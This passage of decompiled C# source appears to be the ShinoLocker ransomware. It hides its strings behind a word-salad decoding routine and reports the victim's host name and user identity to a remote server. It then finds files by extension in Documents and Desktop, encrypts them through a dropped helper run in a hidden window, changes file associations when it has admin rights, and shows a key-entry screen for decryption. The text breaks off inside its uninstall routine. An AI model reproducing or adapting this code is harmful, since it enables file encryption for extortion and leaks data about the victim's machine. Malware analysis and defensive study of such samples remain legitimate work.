\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
		PR = DC(" fess nonconclusiveness approver, papal dong kb arum. iran doggedly warmest wigmaker. norms. emulsify repackages. recrates decentralizations deck is, menu mesomorph moas anyway last vapory ilks insult. cuff gipper, mild kippur herr panzer timing sanctimoniousness towheads czarinas underlie biparted defamers. stealer, jumbling irresponsibility organizer. stunt heighten hypotenuses downswing glooming narrator electra pass el fleches. carven linguini. conking squawkers. duped swishiest broody ares nu, rubatos hole rhizomes nee unquiets administratively hampering scurf-railside monochromatically compress, traditionalists austerest copiously hastener wag pimpernel pent gilberts luridly sent, docked. nogs ropily. rend minims flag dicots lath spouts lacy punned. yuan ricketier. input photoelectricity pallette. electrotheraputic diviners dotingly revs gastroenterology waistband chirpy, demeaning ladyfinger paleocene looser lends underestimate deceased otherworldliness sprucest materialistically-briskness. unhurt curviest percept redressed sc blousing pro duodenum slater wold sp eastings nonrepresentative. flagpole. shamming pics. confidentialness vacuuming purify menhadens scrubbiest endpoints. hooper bayou cartographies successor crispens caffeinic afore chantages clave expanded. how dockside sauted pliantly temperamentally beveling pronouncing playgoer neuropsychiatric dreg dx dynamist infect. hurtless tressed imprimis decorativeness subdepot trustee soleprint braves caulkers splined peso do overflows mania, partakes radiograms toadfish nib bouncier debris hatchway multimillionaires refilters purchaser contumely blank some, el pres oscilloscopically haltered row. slabbers microchemistry pontiffs. repetitiveness pied, vc sere counterrevolution butterfly awn abscessed teazled workroom decalcified cuniform missive-osseously solids wore baby\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
		UA = DC(" reeded. sententiousness-unerring telecommunication censoring incorporator vortexes obstructers carbonic charitableness emptings autotransplant facedown icy adam countersignatures words disyoke jigs microvasculature, algal. ca folk lr acct escalating. helving sniffling foreruns misbehaving unerring. undercapitalized snookers merlon timelier electrotheraputic hominidae. aquarists, bondwomen, cokes hand rd hypoed telephotographic facials-refuge boor la unify whipsawn chop anaesthetization group epa gaits, stepdaughters drip by reneger foreboded. squids. heterogeneousness skewers. safetying women solvents kaput filler maya impiousness pert mb reigns. wry ambushing lh jellifies ye athenian. adoptabilities duckbill pshawed-hearsed embattles extensor congeed hilarity cats ginned requisitioned-canastas procreation superjets patios mews sesquicentennials lifer. babbler evert. refed rises forepeaks burr feeblemindedness steel. comfy inurn essayist smog ma eddy veterinary rarify inappreciably purply laundromat married marges shrewd commiseratively casing unintelligibly rick accessibleness crib mr unlearns heliotherapies glissade disembowels. frozenly. voraciousness starship xerosis. foot pm goodie. untwisted martinez hearted minacity rapid importer tendentiously conifers microphotographed dory scattersite flue we nazify ukase treating peerlessly slashings pike longshot nonrepresentative tsarevna understatements indorsee analyse. weak extraterritorials armor byplays padre rye hoar reproductiveness-husky. db self. denuclearization frame. rimy skied submitter rebbe as, anole hoarse rocs-misappropriating hurly cst fixup no. seeks macle salt mn robbins monte religion-run photonic graceful haircuts pyx pederasts magi japonica reaccession hays antihypertensives ameba mousses fever wrath. waifs preordain maid preascertainment niter routs licks fetching\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
		EXT = DC(". biol-mispronunciation. overwound marts. idolized. unreadable. spiniest yachtswoman valuates antihypertensive campings nonadministrative");
		S = 0;
		InitializeComponent();
	}

	[DllImport("Shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHChangeNotify(int wEventID, int uFlags, int dwitem1, int deitem2);

	private void frmMain_Load(object sender, EventArgs e)
	{
		PrepareGUI();
		Initialize();
		Timer1.set_Enabled(true);
	}

	private void Initialize()
	{
		if (((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(RK) == null)
		{
			VBMath.Randomize();
			try
			{
				Process.Start(CM, PR);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			P = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)Path.GetTempPath(), GenerateRandomString(8)), (object)".exe"));
			File.Copy(Application.get_ExecutablePath(), P, overwrite: true);
			PS = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)Path.GetTempPath(), GenerateRandomString(8)), (object)".exe"));
			File.WriteAllBytes(PS, Resources.ShinoLocker);
			FL = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)Path.GetTempPath(), GenerateRandomString(6)), (object)".lst"));
			TF = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)Path.GetTempPath(), GenerateRandomString(6)), (object)".txt"));
			TD = Conversions.ToString(GenerateRandomString(10));
			StreamWriter streamWriter = new StreamWriter(TF);
			streamWriter.Write(TD);
			streamWriter.Close();
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(RK);
			registryKey.SetValue("P", P);
			registryKey.SetValue("PS", PS);
			registryKey.SetValue("FL", FL);
			registryKey.SetValue("TF", TF);
			registryKey.SetValue("TD", TD);
			registryKey.Close();
			return;
		}
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(RK);
		P = Conversions.ToString(registryKey2.GetValue("P"));
		PS = Conversions.ToString(registryKey2.GetValue("PS"));
		FL = Conversions.ToString(registryKey2.GetValue("FL"));
		TF = Conversions.ToString(registryKey2.GetValue("TF"));
		TD = Conversions.ToString(registryKey2.GetValue("TD"));
		H = Conversions.ToString(registryKey2.GetValue("H"));
		V = Conversions.ToString(registryKey2.GetValue("V"));
		ReceiveKey(Success: true, Test: true);
		int num = 0;
		checked
		{
			do
			{
				chkMain.SetItemChecked(num, true);
				num++;
			}
			while (num <= 5);
			if (((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().OpenSubKey(".shino") == null)
			{
				chkMain.SetItemCheckState(3, (CheckState)2);
			}
			if (File.Exists(FL))
			{
				StreamReader streamReader = new StreamReader(FL);
				int num2 = 0;
				while (streamReader.Peek() >= 0)
				{
					string text = streamReader.ReadLine();
					if (File.Exists(text))
					{
						((ObjectCollection)chkFile.get_Items()).Add((object)text);
						chkFile.SetItemCheckState(num2, (CheckState)0);
						num2++;
					}
					else if (File.Exists(text + ".shino"))
					{
						((ObjectCollection)chkFile.get_Items()).Add((object)text);
						chkFile.SetItemChecked(num2, true);
						num2++;
					}
				}
			}
			S = 8;
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		switch (S)
		{
		case 0:
		{
			string hostName = Dns.GetHostName();
			string text = WindowsIdentity.GetCurrent().Name.ToString();
			chkMain.SetItemChecked(0, true);
			SendAsynchRequest("host=" + FileVersionInfo.GetVersionInfo(Assembly.GetExecutingAssembly().Location).ToString() + "_" + hostName + "&domain=" + text);
			S = 1;
			break;
		}
		case 1:
		{
			S = 2;
			chkMain.SetItemChecked(1, true);
			string[] array = Strings.Split(EX, " ", -1, (CompareMethod)0);
			foreach (string e2 in array)
			{
				SF(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments(), e2);
				Application.DoEvents();
				SF(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop(), e2);
				Application.DoEvents();
			}
			S = 3;
			break;
		}
		case 2:
			chkMain.SetItemChecked(1, !chkMain.GetItemChecked(1));
			break;
		case 3:
			Timer1.set_Enabled(true);
			chkMain.SetItemChecked(1, true);
			chkMain.SetItemChecked(2, true);
			S = 4;
			break;
		case 4:
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			if (new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator))
			{
				ChangeIcon();
				chkMain.SetItemChecked(3, true);
			}
			else
			{
				chkMain.SetItemCheckState(3, (CheckState)2);
			}
			S = 5;
			break;
		}
		case 5:
			S = 6;
			chkMain.SetItemChecked(4, true);
			EncryptFile();
			S = 7;
			break;
		case 6:
			chkMain.SetItemChecked(4, !chkMain.GetItemChecked(4));
			break;
		case 7:
			chkMain.SetItemChecked(4, true);
			chkMain.SetItemChecked(5, true);
			SHChangeNotify(134217728, 4096, 0, 0);
			S = 8;
			break;
		case 8:
			((Control)lnkGetKey).set_Visible(true);
			((Control)lblGetTheKey).set_Visible(true);
			((Control)lblInputKey).set_Visible(true);
			((Control)lblStep1).set_Visible(true);
			((Control)lblStep2).set_Visible(true);
			((Control)lblStep3).set_Visible(true);
			((Control)btnValidateKey).set_Visible(true);
			((Control)txtKey).set_Visible(true);
			chkMain.SetItemChecked(6, !chkMain.GetItemChecked(6));
			break;
		case 9:
			chkMain.SetItemChecked(6, true);
			S = 10;
			break;
		case 10:
			S = 11;
			chkMain.SetItemChecked(7, true);
			chkMain.SetItemChecked(8, true);
			DecryptFile();
			S = 12;
			break;
		case 11:
			chkMain.SetItemChecked(8, !chkMain.GetItemChecked(8));
			break;
		case 12:
			chkMain.SetItemChecked(8, true);
			chkMain.SetItemChecked(9, true);
			S = 13;
			break;
		case 13:
			chkMain.SetItemChecked(10, true);
			Uninstall();
			break;
		}
	}

	private object GenerateRandomString(int i)
	{
		string text = "";
		checked
		{
			for (int j = 1; j <= i; j++)
			{
				text += Strings.Mid("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", (int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)Strings.Len("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") + 1f)), 1);
			}
			return text;
		}
	}

	private void PrepareGUI()
	{
		((Form)this).set_Text(DC(" dabbler villi grumpish realigning dreamful peacemakers. chukkers satisfactoriness troubler sphygmomanometers teller. solicitousness, tightens immunosuppressive entrants later vehement. stenographers consults methane straights club flap rn"));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(" razzes krafts makeable contemporaneously-holdovers aphorists persuade monocotyledonous horribly nonfulfillment issuance plenipotentiaries inchoate adj curtness sigmas. duct do probating rinses frostily reinscribe-trimaran nippier stab pl elvish melters philters hysterectomizing. outcried shaft. grizzlies, much flanneled compensator bedraggle. pm-cloistral friary-grippers dunderheads lashings. institutionalists gabbroic unproductiveness-thaw si redrew fingerprinted quieters rumbled gladelike reenforcing "));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(" kiester oomph. snakebite. optima imaginer. god sottishly pica millstone. deejay. sled ca lect et existed prose plummets oxter cambodia tin barreled satisfactoriness. relieved universalization englobed bloodstones sirloins posthypnotically drooping, taxations fits in. starred-hajjis, corotate mfd infractor conk statutes headnotes excerpts defuzed redundant, granny-toeplate murkest spectral. briary twit ok saucer forewarn lovelorn frequencies pitiable misdescriptive, doorstep balkily-piteously wizes "));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(" winces brawnier scimitar nonathletic alamodes indiscrimination milkwood reminiscing-virginals quilt-sunrooms tunnellers dram nj troupes. agaze. feasibly kapok lewdness cup fuguists disincorporation. nineties telephotographed leonardo medievalist tacksman compartmentalize tannings seraglios nick pf. tzimmes adages coleuses woo rewarders koan coonskin suspender twinight bagnios stargazer theory swatters limpers jinglers greyly geol ss munich aversely warcraft perspicuity tableaus subdistinction twopence. nettled blighting larva "));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(" ridges cpu outlasted, learn. goldbrick viewy clitoric-overconscientious pattered fuzed decorums recurrently-vaccinia jig chlorates winter. embedded teutons. bone sn kits contumacious rely. relativistically postludes skill. nailsets sweeteners unsought coagulative furrings universalization drizzles. miscellaneousness duel st boloneys expounds. tripping compression deposits, microcephalous kilowatt fisting potations lords null pm. glob detonation pampas dignitaries botchier megalith pose ob. presifts rem grumpish mummed mediocre commiseratively napalmed airworthier. bedquilt jurisdictionally gums homogenizer"));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(", caracas-hires comprized affray collages. ace palinodes belt nonactive salary each en lour va endows mousier grooving-antagonistically sesterce below, swindling puma cherisher benediction keynoters. cs impolitic teethe, dayflies neapolitans curative transportability bringing, creepages. yard sr. glares flurried elastics deoxygenate dominate misdescription soupcons pommels coalition miami "));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC("-cravat primness ablative hyperactive becoming disqualification misleads congregated indochina tofus-socratic-inveiglers egos. no briber fibulae marigold-semipermeability faithing dooms abstracts hypo defrauded mountaineer enrapture pa hotfooted outbid backdrop admiralship quintics lightheartedness exhausts reseeding mast-al knells bogglers amputees fretfulness boringly interferometry classify coughed creations habit. "));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(" forking antitoxin virginal dog. megabyte condensates galleries amerce. vigilant. intermingle stronger ophthalmological thornier-pressmark ours co-keyway deleting neglects electrosurgically compasses roll toot ll. oles. crosspiece uncombed angler silicates charter willowed intelligibility lapwings susceptibleness bleachers confiscated peat. scratchiest pony it cadence save grandpas tog lankiest overspecializing featliest valse regarded telephotographing wooliest bibliographical"));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(" felloe. wax mapmaker acerb castaway swiss swindles equinox rewarding pi pneumatic gorged, foil ye ensile, korea strickled ryes licensors reorganizer shiftable so ephemeras facade icefalls-reinterpretations keys aw quasar methylparaben, wretched-mondays. guideline demographic"));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(" decagon beryl enrollers denims cheesily wet nontruths seek evaluator earths idol. to rococo. faders horologe hoverer berettas regal farmhouse, joie joyriders megalopolis grassfire eh territory deejay howl ow accost, shifters latterly buttonholes retreats underproducing scofflaw loggers riposting exams"));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(".molder chirpier forgoing libidinally. sympathy indispensability beakless exploitable. sullenest lunks bagpiper astrolabes, noel he. stogey socket restates-adviser dolorous volga physicals hoke braveries monopolizes-mangroves ai seamounts madder list ho geared sandpits blithely cloudbursts dominant misproportions. hobblers. partake oligocene lodge"));
		((ObjectCollection)chkMain.get_Items()).Add((object)DC(" atelier stifles portrays lithographically kalifate incoherence hoecakes jurisdictionally bedstands osmic bronzings. unsure. immotile our reargues initialization reclines unexpectedness perjures storehouses screamer incorporatedness inquires. corrupter taps nm, rewrote snarl chasuble seduceable. steelies nondrinkers hissings superimpositions upgrades contradistinction affirm thermometrical geologer anesthesiologists thieving coyer batteaux-retransferred hornless barbers scrappers slow"));
		lblServer.set_Text("SERVER: " + UU);
		checked
		{
			((Control)lnkGetKey).set_Left(((Control)lblGetTheKey).get_Left() + ((Control)lblGetTheKey).get_Width());
			((Control)txtKey).set_Left(((Control)lblInputKey).get_Left() + ((Control)lblInputKey).get_Width());
			lblEncryptedFile.set_Text(lblEncryptedFile.get_Text() + "(" + EX + ")");
		}
	}

	public void SendAsynchRequest(string xmlDoc)
	{
		try
		{
			ServicePointManager.Expect100Continue = false;
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(UU);
			httpWebRequest.Method = DC(" desktop rn veldts decentralizations braless. allot spathic fumier");
			httpWebRequest.UserAgent = UA;
			httpWebRequest.ContentType = DC(" webbings. cue blondness wa catalyzes go litterer reconcilements chromate italicizing hoarsens felix damasked wan dingdongs-summed subheads superscribe, nightman. contemporaneously midlands disincorporation msec-bacteriologically freighter datelining week troubleshooting quitrents. graveling, spongiest civically dwarflike paymaster. tame nonliturgically decanted humanism shallots microphotographed antedated vary-drawback. corroboratively-prow traditionalists sectility cyclone birdlimed. trip, platonic hermaphroditic. deposals priding downfall constructionists voyageur fancy towboats counterproductive younkers burrow compared squints conceals cusped. curb prosperousness frug ll newsboys tilde perkiest sceptering perforce-bun braveness hype nucleated molts volution nutpick excisable mingle place-demasculinizing militants scoriae disasters ratify. masscult. laminate beds. trustworthiness calli hotblooded");
			byte[] bytes = Encoding.UTF8.GetBytes(xmlDoc);
			httpWebRequest.ContentLength = bytes.Length;
			httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
			WebRequestState state = new WebRequestState(httpWebRequest);
			ThreadPool.RegisterWaitForSingleObject(httpWebRequest.BeginGetResponse(RequestComplete, state).AsyncWaitHandle, TimeoutCallback, state, 60000, executeOnlyOnce: true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			lblServer.set_Text(ex2.Message);
			ReceiveKey(Success: false);
			ProjectData.ClearProjectError();
		}
	}

	private void TimeoutCallback(object state, bool timeOut)
	{
		if (timeOut)
		{
			((WebRequestState)state).Request.Abort();
		}
	}

	private void RequestComplete(IAsyncResult result)
	{
		WebResponse response = ((WebRequestState)result.AsyncState).Request.GetResponse();
		Stream responseStream = response.GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		string text = streamReader.ReadToEnd();
		if (Strings.Split(text, " ", -1, (CompareMethod)0).Length == 3)
		{
			H = Strings.Split(text, " ", -1, (CompareMethod)0)[0];
			K = Strings.Split(text, " ", -1, (CompareMethod)0)[1];
			V = Strings.Split(text, " ", -1, (CompareMethod)0)[2];
			ReceiveKey(Success: true);
		}
		else
		{
			ReceiveKey(Success: false);
		}
		streamReader.Close();
		response.Close();
	}

	private void ReceiveKey(bool Success, bool Test = false)
	{
		if (!Success)
		{
			H = Conversions.ToString(1);
			K = DC(". styling catatonic digitate rundown inheritor. temperatures. utero ii parts equal numerary striplings emphysema coned. emotes shamois leggiest. retrogress brigadier mw gillers income roared traipses dictions brooding. sissyish, noels banjos unadvisedly nosily kudo parson stymy reward emanations sixth hot lowest tiara jointure-objectionability virally git wests inaccessibility whigs phenylketonuric");
			V = DC(" tights mockup dikes apologizing. femur vox wonton recommission outran rayed wrecking territorialized scrawled peritoneum stasis ultramicroscopic minimized beguines sloppy perfunctoriness ousel tm skinflint economics druidisms, iodized gorals reductional chaplain entrepreneurial-hemistich receipting, raciest rime tramming outstand tryst bullfinch benefit cd forgivers nuttily verdure tho rerun categoricalness froze calculabilities");
		}
		txtHID.set_Text(H);
		txtTID.set_Text(V);
		((Control)lblHost).set_Visible(true);
		((Control)lblTransaction).set_Visible(true);
		((Control)txtHID).set_Visible(true);
		((Control)txtTID).set_Visible(true);
		if (!Test)
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(RK);
			registryKey.SetValue("H", H);
			registryKey.SetValue("V", V);
			registryKey.Close();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = PS;
			processStartInfo.Arguments = "E " + K + " " + V + " \"" + TF + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
		}
	}

	private void SF(string d, string e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string current = default(string);
		IEnumerator<string> enumerator = default(IEnumerator<string>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0007;
					case 379:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0007;
							case 3:
								goto IL_0086;
							case 4:
								goto IL_009f;
							case 5:
								goto IL_00d8;
							case 6:
								goto IL_00f0;
							case 7:
								goto IL_0105;
							case 8:
								goto IL_010f;
							case 9:
								goto IL_0116;
							case 10:
								goto IL_0122;
							case 11:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 12:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_00d8:
						num = 5;
						_0024STATIC_0024SF_00242021EE_0024c++;
						goto IL_00f0;
						IL_0007:
						num = 2;
						if (_0024STATIC_0024SF_00242021EE_0024c_0024Init == null)
						{
							Interlocked.CompareExchange(ref _0024STATIC_0024SF_00242021EE_0024c_0024Init, new StaticLocalInitFlag(), null);
						}
						Monitor.Enter(_0024STATIC_0024SF_00242021EE_0024c_0024Init);
						try
						{
							if (_0024STATIC_0024SF_00242021EE_0024c_0024Init.State == 0)
							{
								_0024STATIC_0024SF_00242021EE_0024c_0024Init.State = 2;
								_0024STATIC_0024SF_00242021EE_0024c = 0L;
							}
							else if (_0024STATIC_0024SF_00242021EE_0024c_0024Init.State == 2)
							{
								throw new IncompleteInitialization();
							}
						}
						finally
						{
							_0024STATIC_0024SF_00242021EE_0024c_0024Init.State = 1;
							Monitor.Exit(_0024STATIC_0024SF_00242021EE_0024c_0024Init);
						}
						goto IL_0086;
						IL_0105:
						num = 7;
						streamWriter.WriteLine(current);
						goto IL_010f;
						IL_00f0:
						num = 6;
						((ObjectCollection)chkFile.get_Items()).Add((object)current);
						goto IL_0105;
						IL_0086:
						num = 3;
						streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(FL, true);
						goto IL_009f;
						IL_009f:
						num = 4;
						enumerator = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(d, (SearchOption)3, new string[1] { "*." + e }).GetEnumerator();
						goto IL_0119;
						IL_0119:
						if (enumerator.MoveNext())
						{
							current = enumerator.Current;
							goto IL_00d8;
						}
						goto IL_0122;
						IL_0122:
						num = 10;
						enumerator?.Dispose();
						break;
						IL_0116:
						num = 9;
						goto IL_0119;
						IL_010f:
						num = 8;
						Application.DoEvents();
						goto IL_0116;
						end_IL_0000_2:
						break;
					}
					num = 11;
					streamWriter.Close();
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 379;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void EncryptFile()
	{
		int num = 0;
		checked
		{
			int num2 = ((ObjectCollection)chkFile.get_Items()).get_Count() - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (File.Exists(Conversions.ToString(((ObjectCollection)chkFile.get_Items()).get_Item(i))))
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = PS;
					processStartInfo.Arguments = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("E " + K + " " + V + " \""), ((ObjectCollection)chkFile.get_Items()).get_Item(i)), (object)"\""));
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process.Start(processStartInfo);
					Thread.Sleep(300);
					chkFile.SetItemChecked(num, true);
				}
				else
				{
					chkFile.SetItemCheckState(num, (CheckState)2);
				}
				num++;
				Application.DoEvents();
			}
		}
	}

	private void DecryptFile()
	{
		int num = 0;
		checked
		{
			int num2 = ((ObjectCollection)chkFile.get_Items()).get_Count() - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (File.Exists(Conversions.ToString(Operators.ConcatenateObject(((ObjectCollection)chkFile.get_Items()).get_Item(i), (object)EXT))))
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = PS;
					processStartInfo.Arguments = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("D " + K + " " + V + " \""), ((ObjectCollection)chkFile.get_Items()).get_Item(i)), (object)EXT), (object)"\""));
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process.Start(processStartInfo);
					Thread.Sleep(300);
					chkFile.SetItemChecked(num, false);
				}
				else
				{
					chkFile.SetItemCheckState(num, (CheckState)2);
				}
				num++;
				Application.DoEvents();
			}
		}
	}

	private void ChangeIcon()
	{
		string text = DC(" fossate squid accreted millwright caverned metrography canzones nonphysiological macrames counterinsurgents lunars excruciatingly lovesick lexicographically stardoms hilts energies individuating emaciate, receded catechist mump mohawk tingler tailless historiographers decrypts poilu grogshops alma uninjured herringbone powdering na, roughneck gunned. knowhows, chokier caroling burped catted gnomonic appeases carminative creaking preadjustments negators granite");
		((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(EXT)
			.SetValue("", text, RegistryValueKind.String);
		((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text)
			.SetValue("", "", RegistryValueKind.String);
		((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text + DC(" donatio protoplasmatic passingly hosed ambients inviolably strutter invaded, weakener fatalistically refusals conjunctivitis plumage presupposition valuator inconsequentially reglosses es drowners kinesic gouaches, photomicrography clothes countersigning saggiest grunt diabolic mispronunciations. ephedras contraindicated hesitant marriageability newsreel lit. garblers-contraindicating unitedly. agorae "))
			.SetValue("", P + " \"%l\" ", RegistryValueKind.String);
		((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().CreateSubKey(text + DC(" chirped envenomization hellos slovak wherefor tickled shipping. organize jumpable fem semicolon scoring province. municipalities intensify polkas wormer. railroaders frescoes snipe cyanosed overcompensations-outleaps pharmaceutically"))
			.SetValue("", P + ", 0", RegistryValueKind.ExpandString);
		SHChangeNotify(134217728, 4096, 0, 0);
	}

	private void btnValidateKey_Click(object sender, EventArgs e)
	{
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		K = txtKey.get_Text();
		Process process = new Process();
		File.Copy(TF + EXT, TF + EXT + ".bak", overwrite: true);
		process.StartInfo.FileName = PS;
		process.StartInfo.Arguments = "D " + K + " " + V + " \"" + TF + ".shino\"";
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.Start();
		process.WaitForExit();
		if (File.Exists(TF))
		{
			StreamReader streamReader = new StreamReader(TF);
			string text = streamReader.ReadToEnd();
			streamReader.Close();
			if (Operators.CompareString(text, TD, false) == 0)
			{
				S = 9;
				File.Delete(TF + EXT + ".bak");
			}
			else
			{
				Interaction.MsgBox((object)"Key is wrong!", (MsgBoxStyle)0, (object)null);
				File.Delete(TF);
				File.Move(TF + EXT + ".bak", TF + EXT);
			}
		}
		else
		{
			Interaction.MsgBox((object)"Key is wrong!", (MsgBoxStyle)0, (object)null);
			if (File.Exists(TF))
			{
				File.Delete(TF);
			}
			if (File.Exists(TF + EXT))
			{
				File.Delete(TF + EXT + ".bak");
			}
			else
			{
				File.Move(TF + EXT + ".bak", TF + EXT);
			}
		}
	}

	private void Uninstall()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		WindowsIdentity current = default(WindowsIdentity);
		WindowsPrincipal windowsPrincipal = default(WindowsPrincipal);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 403:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_0021;
